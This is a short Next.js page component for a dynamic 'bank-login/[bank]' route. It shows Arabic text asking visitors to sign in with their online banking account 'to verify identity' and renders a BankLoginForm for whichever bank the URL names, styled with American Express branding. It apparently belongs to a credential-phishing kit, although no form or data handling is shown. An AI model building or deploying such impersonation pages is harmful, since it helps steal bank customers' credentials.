// app/bank-login/[bank]/page.jsx
import BankLoginForm from '../../../components/BankLoginForm';

export default async function BankLoginPage({ params }) {
  const bank = params.bank;

  return (
    <div className='container mx-auto px-4 py-12'>
      <div className='mx-auto mb-8 max-w-md text-center'>
        <h1 className='mb-4 text-2xl font-bold'>
          الخدمات المصرفية <span className='text-amex-blue'>عبر الإنترنت</span>
        </h1>
        <p className='text-gray-300'>
          يرجى تسجيل الدخول باستخدام حساب الخدمات المصرفية عبر الإنترنت الخاص بك
          للتحقق من هويتك.
        </p>
      </div>

      <BankLoginForm bank={bank} />
    </div>
  );
}
